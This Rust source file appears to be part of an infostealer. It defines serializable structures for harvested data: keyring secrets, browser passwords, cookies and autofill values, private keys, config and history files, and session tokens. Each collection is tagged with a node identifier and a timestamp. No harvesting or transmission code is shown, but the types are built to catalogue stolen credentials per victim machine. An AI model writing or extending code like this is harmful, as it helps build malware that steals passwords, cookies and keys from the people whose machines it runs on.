use serde::Serialize;
// use crate::errors::CollectError;

#[derive(Serialize)]
pub struct Collection {
    pub items: Vec<CollectedItem>,
    pub timestamp: u64,
    pub node_id: [u8; 32],
}

#[derive(Serialize)]
pub struct CollectedItem {
    pub kind: ItemKind,
    // pub source: String,
    pub data: CollectedData,
}

#[derive(Serialize)]
pub enum CollectedData {
    Keyring {
        path: String,
        label: String,
        secret: Vec<u8>,
        content_type: String,
    },
    BrowserAutofill {
        browser: String,
        field: String,
        value: Vec<u8>,
    },
    BrowserCred {
        browser: String,
        url: String,
        username: String,
        password: Vec<u8>,
    },
    BrowserCookie {
        browser: String,
        host: String,
        name: String,
        value: Vec<u8>,
        path: String,
        expires: i64,
    },
    File {
        path: String,
        content: Vec<u8>,
    },
    Command {
        source: String,
        line: String,
    },
}

#[repr(u8)]
#[derive(Clone, Copy, Serialize)]
pub enum ItemKind {
    KeyringSecret = 0x01u8,
    BrowserCredential = 0x02,
    BrowserCookie = 0x03,
    BrowserAutofill = 0x04,
    PrivateKey = 0x05,
    Config = 0x06,
    History = 0x07,
    SessionToken = 0x08,
}